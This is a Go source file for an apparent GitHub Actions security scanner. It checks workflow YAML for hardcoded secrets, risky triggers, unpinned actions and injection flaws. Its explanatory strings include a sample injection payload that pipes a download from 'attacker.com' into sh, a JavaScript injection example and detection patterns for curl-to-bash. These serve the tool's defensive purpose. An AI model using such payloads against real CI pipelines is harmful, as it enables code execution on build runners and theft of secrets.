package scanner

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"gopkg.in/yaml.v3"
)

// Issue represents a detected vulnerability
type Issue struct {
	Rule     string `json:"rule"`
	Severity string `json:"severity"`
	Location string `json:"location"`
	PoC      string `json:"poc,omitempty"`
	Exploit  string `json:"exploit,omitempty"`
	Impact   string `json:"impact"`
	Fix      string `json:"fix"`
}

// Workflow represents the structure of a GitHub Actions YAML
type Workflow struct {
	Name        string         `yaml:"name"`
	On          interface{}    `yaml:"on"` // Can be string, list, or map
	Permissions interface{}    `yaml:"permissions"`
	Jobs        map[string]Job `yaml:"jobs"`
}

type Job struct {
	Permissions    interface{} `yaml:"permissions"`
	TimeoutMinutes int         `yaml:"timeout-minutes"`
	Steps          []Step      `yaml:"steps"`
}

type Step struct {
	Name string                 `yaml:"name"`
	Uses string                 `yaml:"uses"`
	Run  string                 `yaml:"run"`
	Env  map[string]string      `yaml:"env"`
	With map[string]interface{} `yaml:"with"`
}

const maxFileSize = 1024 * 1024 // 1 MB

// Check remote repository for vulnerable files or workflows
func FetchRemoteRepo(repoURL string) (string, error) {
	if !strings.HasPrefix(repoURL, "https://github.com/") {
		return "", fmt.Errorf("only GitHub URLs are supported currently")
	}

	tempDir, err := os.MkdirTemp("", "forgeguard-remote-*")
	if err != nil {
		return "", err
	}

	err = os.WriteFile(filepath.Join(tempDir, "remote_warning.txt"), []byte("Note: Deep remote scanning requires GitHub API integration."), 0644)
	return tempDir, err
}

func checkPermissions(perms interface{}, scope string) []Issue {
	var issues []Issue

	if pStr, ok := perms.(string); ok {
		if pStr == "write-all" {
			issues = append(issues, Issue{
				Rule:     "Overly Permissive Tokens",
				Severity: "CRITICAL",
				Location: scope,
				PoC:      "permissions: write-all",
				Exploit:  "A compromised runner inherits the GITHUB_TOKEN which has full admin rights over the repo. The attacker extracts this token from the environment and uses the GitHub API to push malicious code.",
				Impact:   "Complete repository compromise, ability to push code, overwrite releases, and alter packages.",
				Fix:      "Use principle of least privilege. Explicitly define only the permissions required (e.g., 'contents: read').",
			})
		}
	} else if pMap, ok := perms.(map[string]interface{}); ok {
		for k, v := range pMap {
			if v == "write" && (k == "contents" || k == "packages" || k == "security-events" || k == "actions") {
				issues = append(issues, Issue{
					Rule:     "Dangerous Token Permission",
					Severity: "HIGH",
					Location: scope,
					PoC:      fmt.Sprintf("permissions:\n  %s: write", k),
					Exploit:  "A compromised runner extracts the GITHUB_TOKEN and leverages its write access to the specific scope.",
					Impact:   fmt.Sprintf("Grants write access to %s, allowing attackers to manipulate critical repository components.", k),
					Fix:      "Ensure this workflow strictly requires write access. Downgrade to 'read' if possible.",
				})
			}
		}
	}
	return issues
}

func ScanFile(filepath string) ([]Issue, error) {
	info, err := os.Stat(filepath)
	if err != nil {
		return nil, err
	}
	if info.Size() > maxFileSize {
		return nil, fmt.Errorf("file too large to scan (exceeds 1MB limit)")
	}

	data, err := os.ReadFile(filepath)
	if err != nil {
		return nil, err
	}
	return ScanData(data)
}

func extractMatch(regex *regexp.Regexp, content string) string {
	match := regex.FindString(content)
	if len(match) > 30 {
		return match[:10] + "..." + match[len(match)-10:]
	}
	return match
}

func ScanData(data []byte) ([]Issue, error) {
	var workflow Workflow
	if err := yaml.Unmarshal(data, &workflow); err != nil {
		return nil, err
	}

	var issues []Issue

	// Expanded regex for secrets
	awsKeyRegex := regexp.MustCompile(`(?i)AKIA[0-9A-Z]{16}`)
	githubPatRegex := regexp.MustCompile(`(?i)(ghp|github_pat)_[a-zA-Z0-9]{36,}`)
	slackWebhookRegex := regexp.MustCompile(`https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+`)
	genericSecretRegex := regexp.MustCompile(`(?i)(password|passwd|secret|token|api_key)\s*[:=]\s*['"]?[a-zA-Z0-9\-_]{16,}['"]?`)

	contentStr := string(data)
	if awsKeyRegex.MatchString(contentStr) {
		issues = append(issues, Issue{
			Rule:     "Hardcoded AWS Key",
			Severity: "CRITICAL",
			Location: "Global (File content)",
			PoC:      extractMatch(awsKeyRegex, contentStr),
			Exploit:  "Attackers clone/scrape the public repository and extract the plaintext AWS credential to authenticate to the AWS API.",
			Impact:   "Anyone who can read this repo can compromise the associated AWS environment.",
			Fix:      "Move this credential to GitHub Secrets and reference it via ${{ secrets.AWS_ACCESS_KEY_ID }}.",
		})
	}
	if githubPatRegex.MatchString(contentStr) {
		issues = append(issues, Issue{
			Rule:     "Hardcoded GitHub Token",
			Severity: "CRITICAL",
			Location: "Global (File content)",
			PoC:      extractMatch(githubPatRegex, contentStr),
			Exploit:  "Attackers extract the token from the source code and authenticate as the user/bot account.",
			Impact:   "Full repository or organization compromise, depending on the token's scope.",
			Fix:      "Store the token securely in GitHub Secrets.",
		})
	}
	if slackWebhookRegex.MatchString(contentStr) {
		issues = append(issues, Issue{
			Rule:     "Hardcoded Slack Webhook",
			Severity: "MEDIUM",
			Location: "Global (File content)",
			PoC:      extractMatch(slackWebhookRegex, contentStr),
			Exploit:  "An attacker uses the extracted URL to send arbitrary POST requests to your internal Slack channels.",
			Impact:   "Spam, internal phishing attacks, or social engineering against company employees.",
			Fix:      "Store the webhook URL in GitHub Secrets.",
		})
	}
	if genericSecretRegex.MatchString(contentStr) {
		issues = append(issues, Issue{
			Rule:     "Potential Hardcoded Secret",
			Severity: "HIGH",
			Location: "Global (File content)",
			PoC:      extractMatch(genericSecretRegex, contentStr),
			Exploit:  "Attackers use automated tools to scan repos for keywords like 'password' or 'token' followed by high-entropy strings.",
			Impact:   "Potential unauthorized access to internal services or 3rd-party APIs.",
			Fix:      "Audit the hardcoded value. If it's a real secret, rotate it and move it to GitHub Secrets.",
		})
	}

	nodeRegex := regexp.MustCompile(`(?i)setup-node@v[123]\b`)
	if nodeRegex.MatchString(contentStr) {
		issues = append(issues, Issue{
			Rule:     "Deprecated Action Environment (Node.js)",
			Severity: "MEDIUM",
			Location: "Global (File content)",
			PoC:      extractMatch(nodeRegex, contentStr),
			Exploit:  "Older Node.js versions have known CVEs. If an attacker can execute code, they can leverage these unpatched vulnerabilities for privilege escalation or container escape.",
			Impact:   "Increased attack surface on the build runner.",
			Fix:      "Upgrade to setup-node@v4 or newer.",
		})
	}

	if workflow.Permissions != nil {
		issues = append(issues, checkPermissions(workflow.Permissions, "Global workflow")...)
	}

	onBytes, _ := yaml.Marshal(workflow.On)
	onString := string(onBytes)
	if strings.Contains(onString, "pull_request_target") {
		issues = append(issues, Issue{
			Rule:     "Dangerous Trigger (pull_request_target)",
			Severity: "CRITICAL",
			Location: "Workflow 'on' trigger",
			PoC:      "on: pull_request_target",
			Exploit:  "An attacker submits a malicious Pull Request. The workflow runs in the context of the base branch (with access to secrets and a write token), executing the attacker's untrusted code.",
			Impact:   "Secrets exfiltration, repository takeover, and malicious releases.",
			Fix:      "Use 'pull_request' instead, or ensure you never checkout/execute untrusted code when using 'pull_request_target'.",
		})
	}
	if strings.Contains(onString, "workflow_run") {
		issues = append(issues, Issue{
			Rule:     "Dangerous Trigger (workflow_run)",
			Severity: "HIGH",
			Location: "Workflow 'on' trigger",
			PoC:      "on: workflow_run",
			Exploit:  "A privileged workflow is triggered by an unprivileged one. If the privileged workflow downloads and evaluates artifacts from the unprivileged run without validation, an attacker can inject payloads.",
			Impact:   "Privilege escalation from an untrusted PR to a trusted context.",
			Fix:      "Thoroughly sanitize any data or artifacts downloaded from the triggering workflow.",
		})
	}

	curlBashRegex := regexp.MustCompile(`(?i)(curl|wget).*\|\s*(bash|sh)`)

	for jobName, job := range workflow.Jobs {
		jobScope := "Job: " + jobName

		if job.Permissions != nil {
			issues = append(issues, checkPermissions(job.Permissions, jobScope)...)
		}

		if job.TimeoutMinutes == 0 {
			issues = append(issues, Issue{
				Rule:     "Missing Job Timeout",
				Severity: "MEDIUM",
				Location: jobScope,
				PoC:      "timeout-minutes is not set",
				Exploit:  "An attacker submits code that causes the workflow to hang intentionally, or compromises a dependency to install a cryptominer. GitHub's default timeout is 6 hours.",
				Impact:   "Financial resource exhaustion, denial of service for CI/CD runners, and billing surprises.",
				Fix:      "Explicitly set `timeout-minutes: 15` (or appropriate duration) on all jobs.",
			})
		}

		for _, step := range job.Steps {
			stepScope := jobScope
			if step.Name != "" {
				stepScope += " > Step: " + step.Name
			}

			if step.Uses != "" {
				if strings.Contains(step.Uses, "@") {
					parts := strings.Split(step.Uses, "@")
					if len(parts) == 2 {
						version := parts[1]
						matched, _ := regexp.MatchString(`^[a-fA-F0-9]{40}$`, version)
						if !matched {
							issues = append(issues, Issue{
								Rule:     "Unpinned Action Dependency",
								Severity: "HIGH",
								Location: stepScope,
								PoC:      "uses: " + step.Uses,
								Exploit:  "An attacker compromises the 3rd-party repository and overwrites the mutable tag (e.g., @v3) with malicious code. The CI runner pulls the malicious code on the next run.",
								Impact:   "Supply chain attack leading to full CI compromise, secret theft, or backdoored releases.",
								Fix:      "Pin dependencies to a full 40-character commit SHA.",
							})
						}
					}
				}

				if !strings.HasPrefix(step.Uses, "actions/") && !strings.HasPrefix(step.Uses, "github/") && !strings.HasPrefix(step.Uses, "aws-actions/") && !strings.HasPrefix(step.Uses, "azure/") {
					issues = append(issues, Issue{
						Rule:     "Unverified 3rd-Party Action",
						Severity: "LOW",
						Location: stepScope,
						PoC:      "uses: " + step.Uses,
						Exploit:  "Using actions from individual or unknown developers introduces risk if their account is hijacked or if they become malicious.",
						Impact:   "Potential for backdoor injection.",
						Fix:      "Audit the source code of the action, or fork it to a trusted internal registry.",
					})
				}

				if strings.Contains(step.Uses, "actions/github-script") {
					if scriptInter, ok := step.With["script"]; ok {
						scriptStr := fmt.Sprintf("%v", scriptInter)
						if strings.Contains(scriptStr, "${{") && (strings.Contains(scriptStr, "github.event.issue") || strings.Contains(scriptStr, "github.event.pull_request")) {
							issues = append(issues, Issue{
								Rule:     "GitHub Script Injection",
								Severity: "CRITICAL",
								Location: stepScope,
								PoC:      "script: console.log('${{ github.event.issue.title }}')",
								Exploit:  "An attacker creates an issue or PR with the title: `'); malicious_js_code(); //`. The template interpolates this directly into the javascript source, causing it to execute.",
								Impact:   "Remote Code Execution (RCE) inside the runner with access to the `github` object and tokens.",
								Fix:      "Pass untrusted context via environment variables, then access them via `process.env.VAR_NAME`.",
							})
						}
					}
				}
			}

			if step.Run != "" {
				untrustedContexts := []string{
					"github.event.issue.title",
					"github.event.issue.body",
					"github.event.pull_request.title",
					"github.event.pull_request.body",
					"github.event.comment.body",
					"github.head_ref",
					"github.event.review.body",
					"github.event.pages.*.page_name",
					"github.event.commits.*.message",
				}
				for _, ctx := range untrustedContexts {
					if strings.Contains(step.Run, "${{") && strings.Contains(step.Run, ctx) {
						issues = append(issues, Issue{
							Rule:     "Command Injection Risk",
							Severity: "CRITICAL",
							Location: stepScope,
							PoC:      fmt.Sprintf("run: echo \"${{ %s }}\"", ctx),
							Exploit:  "An attacker provides an input like `\"; curl attacker.com/malware | sh #`. The shell evaluates the string dynamically, escaping the echo command and executing the downloaded malware.",
							Impact:   "Remote Code Execution (RCE) on the build runner.",
							Fix:      "Bind the context to an environment variable first (`env: TITLE: ${{ " + ctx + " }}`) and reference it in bash via `\"$TITLE\"`.",
						})
						break
					}
				}

				if curlBashRegex.MatchString(step.Run) {
					issues = append(issues, Issue{
						Rule:     "Remote Code Execution (Curl to Bash)",
						Severity: "HIGH",
						Location: stepScope,
						PoC:      extractMatch(curlBashRegex, step.Run),
						Exploit:  "If the DNS or the server hosting the script is compromised (or a Man-in-the-Middle attack occurs), the attacker modifies the shell script, which is executed immediately without verification.",
						Impact:   "Blind execution of untrusted code on the runner.",
						Fix:      "Download the script, verify its SHA256 checksum, and then execute it.",
					})
				}

				if strings.Contains(step.Run, "::set-env") || strings.Contains(step.Run, "::add-path") {
					issues = append(issues, Issue{
						Rule:     "Deprecated Runner Commands",
						Severity: "HIGH",
						Location: stepScope,
						PoC:      "run: echo '::set-env name=VAR::value'",
						Exploit:  "An attacker who controls any output printed to stdout can inject these commands to overwrite critical environment variables or modify the system PATH.",
						Impact:   "Environment hijacking leading to RCE.",
						Fix:      "Use `echo \"VAR=value\" >> $GITHUB_ENV` or `$GITHUB_PATH`.",
					})
				}

				envInjectRegex := regexp.MustCompile(`echo\s+['"]?.*?\$\{?.*?\}?.*?['"]?\s*>>\s*\$GITHUB_ENV`)
				if envInjectRegex.MatchString(step.Run) && strings.Contains(step.Run, "${{") {
					issues = append(issues, Issue{
						Rule:     "Environment File Injection",
						Severity: "HIGH",
						Location: stepScope,
						PoC:      "run: echo \"USER_INPUT=${{ github.event.issue.body }}\" >> $GITHUB_ENV",
						Exploit:  "An attacker provides an input containing newline characters (`\\n`). They can inject new lines into the $GITHUB_ENV file, allowing them to overwrite critical variables like LD_PRELOAD or NODE_OPTIONS.",
						Impact:   "Subsequent steps will execute with compromised environment variables, leading to RCE.",
						Fix:      "Use a heredoc to safely append multiline strings to the environment file.",
					})
				}
			}
		}
	}

	return issues, nil
}
